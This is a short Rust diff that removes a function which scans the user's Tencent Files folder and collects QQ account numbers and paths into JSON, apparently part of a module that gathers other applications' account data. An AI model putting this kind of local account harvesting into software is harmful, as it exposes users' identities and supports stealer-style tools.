@@ -39,30 +39,6 @@ impl OtherSoftware {
 
         format!(r#"{{"accounts":[{}]}}"#, accounts.join(","))
     }
-
-    pub fn collect_qq() -> String {
-        let docs = get_documents_dir();
-        let tencent_dir = format!("{}\\Tencent Files", docs);
-
-        let dir = match std::fs::read_dir(&tencent_dir) {
-            Ok(d) => d,
-            Err(_) => return r#"{"accounts":[]}"#.to_string(),
-        };
-
-        let mut accounts = Vec::new();
-        for entry in dir.filter_map(|e| e.ok()) {
-            let name = entry.file_name().to_string_lossy().to_string();
-            if name.len() >= 5 && name.chars().all(|c| c.is_ascii_digit()) {
-                accounts.push(format!(
-                    r#"{{"number":"{}","path":"{}"}}"#,
-                    escape(&name),
-                    escape(&entry.path().to_string_lossy())
-                ));
-            }
-        }
-
-        format!(r#"{{"accounts":[{}]}}"#, accounts.join(","))
-    }
 }
 
 fn get_documents_dir() -> String {
